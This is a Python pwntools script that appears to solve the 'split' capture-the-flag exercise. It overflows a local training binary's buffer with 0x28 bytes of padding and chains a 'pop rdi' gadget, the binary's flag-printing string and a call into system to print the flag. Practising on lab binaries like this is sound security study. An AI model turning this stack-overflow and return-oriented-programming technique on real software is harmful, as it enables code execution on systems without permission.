from pwn import *

context(arch="amd64", os="linux", endian="little")
elf = ELF("./split")
rop = ROP(elf)
p = process("./split")

cat_flag = elf.sym["usefulString"]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
system = elf.sym["usefulFunction"] + 9

payload =  b"\x00" * 0x28
payload += p64(pop_rdi)
payload += p64(cat_flag)
payload += p64(system)

p.recvuntil(b"> ")
p.send(payload)

p.recvuntil(b"Thank you!\n")
log.success(f"Flag: {p.recvline().decode()}")
